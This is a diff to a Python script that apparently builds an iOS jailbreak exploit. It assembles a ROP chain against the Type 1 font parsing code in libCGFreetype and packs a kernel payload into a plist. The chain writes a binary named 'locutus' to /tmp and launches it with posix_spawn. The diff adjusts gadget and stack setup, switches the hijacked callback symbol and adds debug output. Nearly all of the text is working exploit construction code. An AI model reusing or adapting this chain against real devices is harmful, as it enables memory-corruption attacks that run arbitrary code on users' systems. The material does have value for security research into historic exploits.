@@ -51,10 +51,18 @@ kernstuff += '\0' * ((-len(kernstuff) & 0xfff) + (stub & 0xfff))
 
 plist = '<array><data>%s</data></array>' % base64.b64encode(kernstuff)
 
+#init('R0', 'PC') # WTF
 init('R4', 'R5', 'PC')
+#set_fwd('R4', 0x12345678)
+#set_fwd('R5', 0x87654321)
+make_r7_avail()
+m = marker()
+set_sp_to(m)
+m.mark()
+heapadd(fwd('R7'), fwd('PC'))
+make_avail()
 
-# btw
-locutus_len = os.path.getsize('../../locutus/locutus')
+funcall('_abort', None)
 
 set_r0_to(reloc(0xe, 0x558))
 #funcall('_abort', None)
@@ -152,7 +160,7 @@ locutus_str = ptr('/tmp/locutus', True)
 funcall('_open', locutus_str, O_WRONLY | O_CREAT | O_TRUNC, 0755)
 fd, fdp = stackunkpair()
 store_r0_to(fdp)
-funcall('_write', None, locutus, locutus_len)
+funcall('_write', None, locutus, os.path.getsize('../../locutus/locutus'))
 funcall('_close', fd)
 funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
 
@@ -169,14 +177,18 @@ fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
 
 final, relocs = finalize(reloc(0xd, 0), relocs=True)
 
-heapdump(None)
+#heapdump(None)
 
 # add sp, #400; pop {r4, r5, pc}
 parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
 dmini.cur.choose_file('/System/Library/Frameworks/CoreGraphics.framework/Resources/libCGFreetype.A.dylib')
-actual_parse_callback = dmini.cur.private_sym('_t1_decoder_parse_charstrings').value
+actual_parse_callback = dmini.cur.private_sym('_T1_Parse_Glyph').value
 
-print 'len:', len(final), '/ 4 =', len(final)/4
-print relocs
+#print 'len:', len(final), '/ 4 =', len(final)/4
+#print relocs
+print map(hex, struct.unpack('I'*(len(final)/4), final))
+
+#final = 'food'*500
+#relocs = {4: 3}
 
 open('catalog.txt', 'w').write(pickle.dumps({'parse_callback': parse_callback, 'actual_parse_callback': actual_parse_callback, 'final': final, 'relocs': relocs, 'plist': plist}))
